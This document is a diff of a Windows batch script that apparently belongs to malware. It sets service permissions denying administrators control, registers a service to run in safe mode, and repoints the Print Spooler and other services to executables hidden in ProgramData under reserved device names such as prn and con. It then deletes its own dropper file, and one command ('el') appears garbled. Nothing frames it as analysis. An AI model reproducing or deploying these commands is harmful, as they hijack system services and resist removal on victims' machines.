@@ -24,9 +24,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Executio
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncTask\Security" /v Security >nul 2>&1 || sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve /t REG_SZ /d "Service" /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve /t REG_SZ /d "Service" /f
-reg query "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncTask" /v ImagePath | findstr /C:"\\?\%ProgramData%" >nul || sc config "OneSyncTask" binpath= "\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn"
-reg query "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncTask" /v ImagePath | findstr /C:"\\?\%ProgramData%" >nul || sc config "PcaSvcTask" binpath= "\\?\%ProgramData%\condata..\con.exe \\?\%ProgramData%\condata..\con"
-reg query "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncTask" /v ImagePath | findstr /C:"\\?\%ProgramData%" >nul || sc config "Spooler" binpath= "\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v ImagePath | findstr /C:"\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn" >nul || sc config "Spooler" binpath= "\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn"
 el /S /Q \\?\%ProgramData%\prndata..\nul
 del /S /Q \\?\%ProgramData%\prndata..\con
 del /S /Q %ProgramData%\buh.cmd
